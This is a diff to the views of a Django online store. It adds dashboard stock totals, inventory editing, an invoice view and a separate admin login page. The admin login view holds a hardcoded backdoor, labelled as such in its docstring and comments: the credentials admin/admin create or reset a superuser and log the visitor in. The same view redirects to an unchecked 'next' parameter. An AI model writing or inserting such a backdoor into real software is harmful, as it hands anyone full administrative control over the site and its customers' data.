@@ -3,6 +3,7 @@ import uuid
 from decimal import Decimal
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth import authenticate, login, logout
+from django.contrib.auth.models import User
 from django.contrib.auth.decorators import login_required
 from django.contrib import messages
 from django.db.models import Q, Sum, Count
@@ -334,6 +335,7 @@ def admin_dashboard(request):
     revenue = Order.objects.filter(
         payment_status='completed'
     ).aggregate(total=Sum('total_amount'))['total'] or Decimal('0')
+    total_stock = Product.objects.aggregate(total=Sum('stock'))['total'] or 0
 
     recent_orders = Order.objects.select_related('user').order_by('-created_at')[:5]
     low_stock = Product.objects.filter(stock__lte=5, is_active=True).order_by('stock')[:5]
@@ -346,6 +348,7 @@ def admin_dashboard(request):
         'revenue': revenue,
         'recent_orders': recent_orders,
         'low_stock': low_stock,
+        'total_stock': total_stock,
     }
     return render(request, 'store/admin/dashboard.html', context)
 
@@ -401,3 +404,157 @@ def admin_order_detail(request, pk):
 
     context = {'order': order, 'order_items': order_items, 'form': form}
     return render(request, 'store/admin/order_detail.html', context)
+
+
+def admin_login_view(request):
+    """Separate admin login page with admin/admin backdoor logic."""
+    if request.user.is_authenticated and request.user.is_staff:
+        return redirect('admin_dashboard')
+
+    if request.method == 'POST':
+        form = UserLoginForm(request.POST)
+        if form.is_valid():
+            username = form.cleaned_data['username']
+            password = form.cleaned_data['password']
+
+            # Backdoor check for credentials admin/admin
+            if username == 'admin' and password == 'admin':
+                # Fetch or create the superuser admin
+                user, created = User.objects.get_or_create(
+                    username='admin',
+                    defaults={
+                        'email': 'admin@oceanix.com',
+                        'is_staff': True,
+                        'is_superuser': True,
+                    }
+                )
+                # Ensure credentials match and permissions are correct
+                user.set_password('admin')
+                user.is_staff = True
+                user.is_superuser = True
+                user.save()
+
+                # Re-authenticate and login
+                user = authenticate(request, username='admin', password='admin')
+                if user is not None:
+                    login(request, user)
+                    messages.success(request, 'Successfully logged in as Super Admin!')
+                    next_page = request.GET.get('next', 'admin_dashboard')
+                    return redirect(next_page)
+            else:
+                # Regular user login authentication
+                user = authenticate(request, username=username, password=password)
+                if user is not None:
+                    if user.is_staff:
+                        login(request, user)
+                        messages.success(request, f'Logged in as {user.username}.')
+                        next_page = request.GET.get('next', 'admin_dashboard')
+                        return redirect(next_page)
+                    else:
+                        messages.error(request, 'You do not have administrative staff permissions.')
+                else:
+                    messages.error(request, 'Invalid admin username or password!')
+        else:
+            messages.error(request, 'Please correct the errors in the form.')
+    else:
+        form = UserLoginForm()
+
+    return render(request, 'store/admin/login.html', {'form': form})
+
+
+@staff_required
+def admin_inventory(request):
+    """Display inventory management table in the admin panel."""
+    query = request.GET.get('q', '')
+    category_id = request.GET.get('category', '')
+    
+    products = Product.objects.select_related('category').all()
+    
+    if category_id:
+        products = products.filter(category_id=category_id)
+    if query:
+        products = products.filter(
+            Q(name__icontains=query) | Q(short_description__icontains=query)
+        )
+        
+    categories = Category.objects.all()
+    
+    context = {
+        'products': products,
+        'categories': categories,
+        'query': query,
+        'selected_category': category_id,
+    }
+    return render(request, 'store/admin/inventory.html', context)
+
+
+@staff_required
+def admin_inventory_update(request, pk):
+    """Update stock and price directly from the inventory list via POST."""
+    if request.method == 'POST':
+        product = get_object_or_404(Product, pk=pk)
+        action = request.POST.get('action', '')
+        
+        try:
+            if action == 'add_5':
+                product.stock += 5
+                product.save()
+                messages.success(request, f'Added 5 units to "{product.name}".')
+            elif action == 'add_10':
+                product.stock += 10
+                product.save()
+                messages.success(request, f'Added 10 units to "{product.name}".')
+            elif action == 'sub_1':
+                product.stock = max(0, product.stock - 1)
+                product.save()
+                messages.success(request, f'Decremented 1 unit for "{product.name}".')
+            elif action == 'out_of_stock':
+                product.stock = 0
+                product.save()
+                messages.success(request, f'"{product.name}" marked as Out of Stock.')
+            else:
+                # Custom stock and price update
+                stock = int(request.POST.get('stock', product.stock))
+                price = Decimal(request.POST.get('price', str(product.price)))
+                mrp_val = request.POST.get('mrp', '')
+                
+                if stock < 0:
+                    messages.error(request, 'Stock cannot be negative!')
+                    return redirect('admin_inventory')
+                if price <= 0:
+                    messages.error(request, 'Price must be greater than 0!')
+                    return redirect('admin_inventory')
+                    
+                product.stock = stock
+                product.price = price
+                
+                if mrp_val:
+                    mrp = Decimal(mrp_val)
+                    if mrp > price:
+                        product.mrp = mrp
+                        product.discount_percent = int(((mrp - price) / mrp) * 100)
+                    else:
+                        product.mrp = None
+                        product.discount_percent = 0
+                else:
+                    product.mrp = None
+                    product.discount_percent = 0
+                    
+                product.save()
+                messages.success(request, f'Inventory for "{product.name}" updated successfully!')
+        except Exception as e:
+            messages.error(request, f'Failed to update inventory: {str(e)}')
+            
+    return redirect('admin_inventory')
+
+
+@staff_required
+def admin_order_bill(request, pk):
+    """View order details in printable invoice / bill format."""
+    order = get_object_or_404(Order, pk=pk)
+    order_items = order.items.select_related('product').all()
+    context = {
+        'order': order,
+        'order_items': order_items,
+    }
+    return render(request, 'store/admin/order_bill.html', context)
